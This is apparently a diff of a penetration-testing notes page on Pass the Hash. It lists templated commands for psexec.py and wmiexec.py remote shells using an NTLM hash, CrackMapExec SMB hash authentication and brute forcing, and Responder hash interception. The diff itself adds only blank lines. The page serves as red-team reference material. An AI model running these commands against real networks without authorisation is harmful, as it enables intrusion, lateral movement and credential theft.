@@ -15,11 +15,23 @@ updated_at: '2023-05-30T20:08:34.336365+00:00'
 
 Pass the Hash techniques allow attackers to authenticate to a remote server using an NTLM or LM hash instead of a password.
 
+
+
+
+
 **Command** ([[psexec.py Spawn a cmd.exe shell on a Remote System (NTLM)]]):
 
 ```bash
 psexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
 ```
+
+
+
+
+
+
+
+
 
 **Command** ([[wmiexec.py Spawn a cmd.exe shell on a Remote System (NTLM)]]):
 
@@ -27,11 +39,25 @@ psexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
 wmiexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[CrackMapExec Authenticate with SMB Using an NTLM Hash]]):
 
 ```bash
 crackmapexec smb $TARGET_IP -u $USERNAME -H $NTLM_HASH
 ```
+
+
+
+
+
+
 
 **Command** ([[CrackMapExec Brute Force SMB Usernames and Passwords]]):
 
@@ -39,8 +65,22 @@ crackmapexec smb $TARGET_IP -u $USERNAME -H $NTLM_HASH
 crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[Responder Intercept an NTLM Hash]]):
 
 ```bash
 responder -I $_INTERFACE
 ```
+
+
+
+
+
+
